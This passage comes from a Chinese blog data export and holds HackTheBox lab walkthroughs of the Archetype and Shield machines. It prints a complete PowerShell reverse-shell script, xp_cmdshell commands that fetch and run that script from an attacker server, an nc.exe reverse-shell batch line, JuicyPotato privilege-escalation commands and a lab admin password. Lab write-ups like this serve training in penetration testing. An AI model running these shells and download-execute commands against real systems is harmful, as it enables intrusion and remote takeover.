//10.10.10.27/\n</code></pre>\n<p>-N：匿名登录<br>-L：获取共享资源列表</p>\n<p><img src=\"https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png\"></p>\n<p>可以看到存在一个backups目录，使用smbclient来访问：</p>\n<pre><code>smbclient -N //10.10.10.27/backups\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png\"></p>\n<p>发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：</p>\n<p><img src=\"https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png\"></p>\n<h3 id=\"impacket工具的使用\"><a href=\"#impacket工具的使用\" class=\"headerlink\" title=\"impacket工具的使用\"></a>impacket工具的使用</h3><blockquote>\n<p>下载地址：<a href=\"https://github.com/SecureAuthCorp/impacket/tree/master\">https://github.com/SecureAuthCorp/impacket/tree/master</a></p>\n</blockquote>\n<p><strong>安装</strong>：</p>\n<p>进入impacket目录，执行：</p>\n<pre><code>pip install .\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png\"></p>\n<p>用前面获得的账号和密码登录：</p>\n<pre><code>mssqlclient.py sql_svc@10.10.10.27 -windows-auth\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png\"></p>\n<p>判断当前是否拥有sysadmin权限：</p>\n<pre><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png\"></p>\n<p>返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行</p>\n<h3 id=\"使用数据库调用系统命令\"><a href=\"#使用数据库调用系统命令\" class=\"headerlink\" title=\"使用数据库调用系统命令\"></a>使用数据库调用系统命令</h3><p>依次写入：</p>\n<pre><code>EXEC sp_configure &#39;Show Advanced Options&#39;, 1;            \\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;                                            \\\\确认上面的操作\nsp_configure;                                            \\\\查看当前sp_configure配置情况\nEXEC sp_configure &#39;xp_cmdshell&#39;, 1                        \\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;                                            \\\\确认上面的操作\nxp_cmdshell &quot;whoami&quot;                                     \\\\在靶机上调用cmdshell执行whoami\n</code></pre>\n<p>执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc</p>\n<p><img src=\"https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png\"></p>\n<h3 id=\"获得操作系统普通用户权限\"><a href=\"#获得操作系统普通用户权限\" class=\"headerlink\" title=\"获得操作系统普通用户权限\"></a>获得操作系统普通用户权限</h3><p>我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；</p>\n<p>在桌面新建一个powershell的反弹shell文件shell.ps1（<strong>注意将其中的ip修改为HTB分配的ip</strong>）</p>\n<p>代码如下：</p>\n<pre><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.55&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()\n</code></pre>\n<p>下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；</p>\n<p>因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png\"></p>\n<p>然后开启一个监听端口，用来接收反弹的shell：</p>\n<pre><code>nc -lvvp 443\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png\"></p>\n<p>接着在数据库shell中执行如下命令，反弹shell：</p>\n<pre><code>xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\\&quot;http://10.10.14.55/shell.ps1\\&quot;);&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png\"></p>\n<h3 id=\"获取普通用户权限的flag\"><a href=\"#获取普通用户权限的flag\" class=\"headerlink\" title=\"获取普通用户权限的flag\"></a>获取普通用户权限的flag</h3><p>在nc接收的shell中直接执行下面的命令：</p>\n<pre><code>type C:\\Users\\sql_svc\\Desktop\\user.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png\"></p>\n<h3 id=\"获取系统权限用户的flag\"><a href=\"#获取系统权限用户的flag\" class=\"headerlink\" title=\"获取系统权限用户的flag\"></a>获取系统权限用户的flag</h3><p>使用下面的命令来访问PowerShell历史记录文件：</p>\n<pre><code>type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png\"></p>\n<p>发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：</p>\n<pre><code>psexec.py administrator@10.10.10.27\n</code></pre>\n<p>输入上面获得的密码就可以成功提权</p>\n<p><img src=\"https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png\"></p>\n<p>执行如下命令获得flag：</p>\n<pre><code>type C:\\Users\\Administrator\\Desktop\\root.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/qq_45951598/article/details/115269502\">https://blog.csdn.net/qq_45951598/article/details/115269502</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"nmap扫描：\"><a href=\"#nmap扫描：\" class=\"headerlink\" title=\"nmap扫描：\"></a>nmap扫描：</h4><pre><code>nmap -sC -sV 10.10.10.27\n</code></pre>\n<p>-sC：使用默认脚本进行扫描，等同于–script=default<br>-sV：探测开启的端口来获取服务、版本信息</p>\n<p><img src=\"https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png\"></p>\n<p>可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口</p>\n<h4 id=\"445端口匿名访问\"><a href=\"#445端口匿名访问\" class=\"headerlink\" title=\"445端口匿名访问\"></a>445端口匿名访问</h4><p>测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：</p>\n<pre><code>smbclient -N -L //10.10.10.27/\n</code></pre>\n<p>-N：匿名登录<br>-L：获取共享资源列表</p>\n<p><img src=\"https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png\"></p>\n<p>可以看到存在一个backups目录，使用smbclient来访问：</p>\n<pre><code>smbclient -N //10.10.10.27/backups\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png\"></p>\n<p>发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：</p>\n<p><img src=\"https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png\"></p>\n<h3 id=\"impacket工具的使用\"><a href=\"#impacket工具的使用\" class=\"headerlink\" title=\"impacket工具的使用\"></a>impacket工具的使用</h3><blockquote>\n<p>下载地址：<a href=\"https://github.com/SecureAuthCorp/impacket/tree/master\">https://github.com/SecureAuthCorp/impacket/tree/master</a></p>\n</blockquote>\n<p><strong>安装</strong>：</p>\n<p>进入impacket目录，执行：</p>\n<pre><code>pip install .\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png\"></p>\n<p>用前面获得的账号和密码登录：</p>\n<pre><code>mssqlclient.py sql_svc@10.10.10.27 -windows-auth\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png\"></p>\n<p>判断当前是否拥有sysadmin权限：</p>\n<pre><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png\"></p>\n<p>返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行</p>\n<h3 id=\"使用数据库调用系统命令\"><a href=\"#使用数据库调用系统命令\" class=\"headerlink\" title=\"使用数据库调用系统命令\"></a>使用数据库调用系统命令</h3><p>依次写入：</p>\n<pre><code>EXEC sp_configure &#39;Show Advanced Options&#39;, 1;            \\\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项\nreconfigure;                                            \\\\确认上面的操作\nsp_configure;                                            \\\\查看当前sp_configure配置情况\nEXEC sp_configure &#39;xp_cmdshell&#39;, 1                        \\\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令\nreconfigure;                                            \\\\确认上面的操作\nxp_cmdshell &quot;whoami&quot;                                     \\\\在靶机上调用cmdshell执行whoami\n</code></pre>\n<p>执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\\sql_svc</p>\n<p><img src=\"https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png\"></p>\n<h3 id=\"获得操作系统普通用户权限\"><a href=\"#获得操作系统普通用户权限\" class=\"headerlink\" title=\"获得操作系统普通用户权限\"></a>获得操作系统普通用户权限</h3><p>我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；</p>\n<p>在桌面新建一个powershell的反弹shell文件shell.ps1（<strong>注意将其中的ip修改为HTB分配的ip</strong>）</p>\n<p>代码如下：</p>\n<pre><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.55&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;# &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()\n</code></pre>\n<p>下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；</p>\n<p>因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png\"></p>\n<p>然后开启一个监听端口，用来接收反弹的shell：</p>\n<pre><code>nc -lvvp 443\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png\"></p>\n<p>接着在数据库shell中执行如下命令，反弹shell：</p>\n<pre><code>xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\\&quot;http://10.10.14.55/shell.ps1\\&quot;);&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png\"></p>\n<h3 id=\"获取普通用户权限的flag\"><a href=\"#获取普通用户权限的flag\" class=\"headerlink\" title=\"获取普通用户权限的flag\"></a>获取普通用户权限的flag</h3><p>在nc接收的shell中直接执行下面的命令：</p>\n<pre><code>type C:\\Users\\sql_svc\\Desktop\\user.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png\"></p>\n<h3 id=\"获取系统权限用户的flag\"><a href=\"#获取系统权限用户的flag\" class=\"headerlink\" title=\"获取系统权限用户的flag\"></a>获取系统权限用户的flag</h3><p>使用下面的命令来访问PowerShell历史记录文件：</p>\n<pre><code>type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png\"></p>\n<p>发现administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：</p>\n<pre><code>psexec.py administrator@10.10.10.27\n</code></pre>\n<p>输入上面获得的密码就可以成功提权</p>\n<p><img src=\"https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png\"></p>\n<p>执行如下命令获得flag：</p>\n<pre><code>type C:\\Users\\Administrator\\Desktop\\root.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/qq_45951598/article/details/115269502\">https://blog.csdn.net/qq_45951598/article/details/115269502</a></p>\n</blockquote>\n"},{"title":"HackTheBox-Shield","date":"2021-08-18T09:05:21.000Z","_content":"\n## 实验环境\n\n![](https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png)\n\n## 信息收集\n\n**端口扫描**：\n\n```\nnamp -A -T4 10.10.10.29\n```\n\n发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows\n\n![](https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png)\n\n`--script vuln`参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址\n\n![](https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png)\n\n**目录扫描**，也发现wordpress目录\n\n![](https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png)\n\n**Wpscan分析**，可以看到wordpress的版本\n\n```\nwpscan --url http://10.10.10.29/wordpress\n```\n\n![](https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png)\n\n## 实验过程\n\n用上一台靶机的账号密码可以登录后台`admin`:`P@s5w0rd!`\n\n![](https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png)\n\n知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块\n\n![](https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png)\n\n设置参数\n\n![](https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png)\n\n执行exploit命令后，获得shell\n\n![](https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png)\n\n在shell中执行命令\n\n![](https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png)\n\n查看wp-config.php，发现敏感信息\n\n![](https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png)\n\n**反弹shell**：\n\n在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口\n\n![](https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png)\n\n在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell\n\n![](https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png)\n\n![](https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png)\n\n查看当前用户\n\n![](https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png)\n\n**提权:**\n\n使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到\n\n将js.exe上传到对方机器\n\n![](https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png)\n\n在windows shell中生成一个bat脚本：\n\n```\necho START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 > shell.bat\n```\n\n![](https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png)\n\n在本机使用nc创建一个监听端口，用来接收提权后的windows shell\n\n![](https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png)\n\n运行juicy-potato提权：\n\n```\njs.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n```\n\n![](https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png)\n\n获得system权限的windows shell\n\n![](https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png)\n\n在管理员账户的桌面目录下找到flag\n\n![](https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png)\n\n","source":"_posts/HackTheBox-Shield.md","raw":"---\ntitle: HackTheBox-Shield\ndate: 2021-08-18 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![](https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png)\n\n## 信息收集\n\n**端口扫描**：\n\n```\nnamp -A -T4 10.10.10.29\n```\n\n发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows\n\n![](https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png)\n\n`--script vuln`参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址\n\n![](https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png)\n\n**目录扫描**，也发现wordpress目录\n\n![](https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png)\n\n**Wpscan分析**，可以看到wordpress的版本\n\n```\nwpscan --url http://10.10.10.29/wordpress\n```\n\n![](https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png)\n\n## 实验过程\n\n用上一台靶机的账号密码可以登录后台`admin`:`P@s5w0rd!`\n\n![](https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png)\n\n知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块\n\n![](https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png)\n\n设置参数\n\n![](https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png)\n\n执行exploit命令后，获得shell\n\n![](https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png)\n\n在shell中执行命令\n\n![](https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png)\n\n查看wp-config.php，发现敏感信息\n\n![](https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png)\n\n**反弹shell**：\n\n在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口\n\n![](https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png)\n\n在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell\n\n![](https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png)\n\n![](https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png)\n\n查看当前用户\n\n![](https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png)\n\n**提权:**\n\n使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到\n\n将js.exe上传到对方机器\n\n![](https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png)\n\n在windows shell中生成一个bat脚本：\n\n```\necho START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 > shell.bat\n```\n\n![](https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png)\n\n在本机使用nc创建一个监听端口，用来接收提权后的windows shell\n\n![](https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png)\n\n运行juicy-potato提权：\n\n```\njs.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n```\n\n![](https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png)\n\n获得system权限的windows shell\n\n![](https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png)\n\n在管理员账户的桌面目录下找到flag\n\n![](https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png)\n\n","slug":"HackTheBox-Shield","published":1,"updated":"2021-12-25T12:19:50.095Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyc0006wku11mv9eo4r","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描</strong>：</p>\n<pre><code>namp -A -T4 10.10.10.29\n</code></pre>\n<p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png\"></p>\n<p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p>\n<p><img src=\"https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png\"></p>\n<p><strong>目录扫描</strong>，也发现wordpress目录</p>\n<p><img src=\"https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png\"></p>\n<p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p>\n<pre><code>wpscan --url http://10.10.10.29/wordpress\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p>\n<p><img src=\"https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png\"></p>\n<p>知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png\"></p>\n<p>设置参数</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png\"></p>\n<p>执行exploit命令后，获得shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png\"></p>\n<p>在shell中执行命令</p>\n<p><img src=\"https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png\"></p>\n<p>查看wp-config.php，发现敏感信息</p>\n<p><img src=\"https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png\"></p>\n<p><strong>反弹shell</strong>：</p>\n<p>在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png\"></p>\n<p>在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png\"></p>\n<p><img src=\"https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png\"></p>\n<p>查看当前用户</p>\n<p><img src=\"https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png\"></p>\n<p><strong>提权:</strong></p>\n<p>使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到</p>\n<p>将js.exe上传到对方机器</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png\"></p>\n<p>在windows shell中生成一个bat脚本：</p>\n<pre><code>echo START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png\"></p>\n<p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png\"></p>\n<p>运行juicy-potato提权：</p>\n<pre><code>js.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png\"></p>\n<p>获得system权限的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png\"></p>\n<p>在管理员账户的桌面目录下找到flag</p>\n<p><img src=\"https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描</strong>：</p>\n<pre><code>namp -A -T4 10.10.10.29\n</code></pre>\n<p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png\"></p>\n<p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p>\n<p><img src=\"https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png\"></p>\n<p><strong>目录扫描</strong>，也发现wordpress目录</p>\n<p><img src=\"https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png\"></p>\n<p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p>\n<pre><code>wpscan --url http://10.10.10.29/wordpress\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p>\n<p><img src=\"https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png\"></p>\n<p>知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png\"></p>\n<p>设置参数</p>\n<p><img src=\"https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png\"></p>\n<p>执行exploit命令后，获得shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png\"></p>\n<p>在shell中执行命令</p>\n<p><img src=\"https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png\"></p>\n<p>查看wp-config.php，发现敏感信息</p>\n<p><img src=\"https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png\"></p>\n<p><strong>反弹shell</strong>：</p>\n<p>在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png\"></p>\n<p>在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png\"></p>\n<p><img src=\"https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png\"></p>\n<p>查看当前用户</p>\n<p><img src=\"https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png\"></p>\n<p><strong>提权:</strong></p>\n<p>使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到</p>\n<p>将js.exe上传到对方机器</p>\n<p><img src=\"https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png\"></p>\n<p>在windows shell中生成一个bat脚本：</p>\n<pre><code>echo START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png\"></p>\n<p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png\"></p>\n<p>运行juicy-potato提权：</p>\n<pre><code>js.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png\"></p>\n<p>获得system权限的windows shell</p>\n<p><img src=\"https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png\"></p>\n<p>在管理员账户的桌面目录下找到flag</p>\n<p><img src=\"https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png\"></p>\n"},{"title":"HackTheBox-Vaccine","date":"2021-07-13T09:05:21.000Z","_content":"\n## 实验环境\n\n![Screenshot_2021-08-04_09_35_14](https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sC -sV 